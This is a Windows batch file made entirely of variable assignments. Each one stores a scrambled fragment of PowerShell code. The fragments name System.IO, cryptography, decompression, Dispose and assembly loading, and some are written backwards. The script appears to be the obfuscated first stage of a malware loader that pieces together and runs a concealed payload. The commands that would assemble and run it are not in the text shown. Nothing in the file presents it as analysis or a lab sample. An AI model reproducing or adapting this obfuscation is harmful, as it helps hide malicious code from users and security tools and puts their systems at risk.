@echo off
set "JAXqiqdumk=$WTe"
set "prEufZsyoh=wEE."
set "ZEZgOqvQvm='')("
set "jSyAmyRFai=onve"
set "hDndovmWoS=gnir"
set "FJGFmZxTdR=lBlo"
set "kuIrQOhzlZ===')"
set "GXYEwbKNyR=)))"
set "NUHifOrXkQ=ionM"
set "ddDDHWRoUH=pose"
set "ecySmwaWEb=ddin"
set "wiBmKSdgbn=-1.."
set "WvYITRmsfC=gMod"
set "SSYDFAiXSg=McIH"
set "DBHQEBWbzi=mQk."
set "ermgwtfVif='gni"
set "cJuZounBcr=)($y"
set "NtExZGCpzu=HD, "
set "PaXQpDRGok=S46e"
set "ulFvrfnrha=ring"
set "RxjAWhJPao='[-1"
set "caJgckNoPT=oArr"
set "yUWsBYlNcP=eam("
set "BfsHrhnoxX=m.IO"
set "ItzEBjxGPI=TaP."
set "QRiHAUpkfT=-4] "
set "vrxXsePOsy=tsWi"
set "MStTdDLaXk=comp"
set "dAXldAKZvO=form"
set "AXtNcTUHfP=Obje"
set "AVXIuiChHU=[Env"
set "PgvILQVVFd=le  "
set "zcrsULzgCA=-joi"
set "SXAGzXAIPA=)($P"
set "hFFQDvXfQn=R5jf"
set "wHSHnWZBuD=File"
set "sGHENmyIcb= New"
set "CXPLMWeCTp=('da"
set "webqhItKYh=ose("
set "ReWSPbfPio=embl"
set "TjUfJYvXqy=$PFu"
set "FfXFvcQmSb=pose"
set "ozAaRxvUIt=mQk "
set "ZJfbJdtadB=[IO."
set "kZgRCqyeGN=V = "
set "CoOapHcAMw=zm83"
set "NhgkYMBGUu=rt]:"
set "YARaxeWSYp=ode]"
set "gkTcxxfEvE=;$Mc"
set "PFnZotwDbU=n ''"
set "igajURtmFI=$McI"
set "RknNsAznSD=se()"
set "trOOVXNuGT=stem"
set "arNFULAlHO='oPV"
set "RMcmsnOFDq=Disp"
set "IexZuQIsez=xTLv"
set "VnqALkKDvq= if "
set "zLaOyLUQFO=PFun"
set "GkPAaQYIri=grap"
set "seFkUAKMtC=yste"
set "nvYyLIttUV=stem"
set "xUllnNgPOy=iron"
set "ymWwOumaSA=in $"
set "NUdXCBWsQl=fore"
set "sWUNyysbrf=.Cop"
set "GkIlVGNCfx=;$iV"
set "xjhdjcNFhF=;$HF"
set "COBpMKDDUO=join"
set "zmLqmNUBoY=xTLv"
set "yLhBCzmJeL=($Br"
set "iISahpEeEK=New-"
set "jgiUaIDVQh=tS46"
set "beJIPrdPeW=BQ.T"
set "tasEGuOGbX=F'[-"
set "JYlynLaOnR=();$"
set "ZlHIbHsiJG=y.Ci"
